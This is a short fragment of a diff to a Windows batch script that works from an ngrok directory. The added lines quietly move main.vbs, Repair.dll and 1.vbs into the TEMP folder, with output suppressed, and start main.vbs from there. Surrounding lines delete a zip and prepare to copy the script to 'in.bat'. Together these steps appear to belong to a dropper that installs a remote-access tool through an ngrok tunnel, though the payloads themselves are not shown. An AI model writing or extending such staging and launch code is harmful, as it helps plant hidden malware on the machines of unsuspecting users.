@@ -23,7 +23,13 @@ if exist "%DATA_ZIP%" (
     del "%DATA_ZIP%"
 )
 
-start "" "%NGROK_DIR%\main.vbs"
+:: Move main.vbs, Repair.dll, and 1.vbs to TEMP
+move "%NGROK_DIR%\main.vbs" "%TEMP%\main.vbs" >nul
+move "%NGROK_DIR%\Repair.dll" "%TEMP%\Repair.dll" >nul
+move "%NGROK_DIR%\1.vbs" "%TEMP%\1.vbs" >nul
+
+:: Execute main.vbs from TEMP
+start "" "%TEMP%\main.vbs"
 
 set "SELF=%~f0"
 set "DEST=%NGROK_DIR%\in.bat"
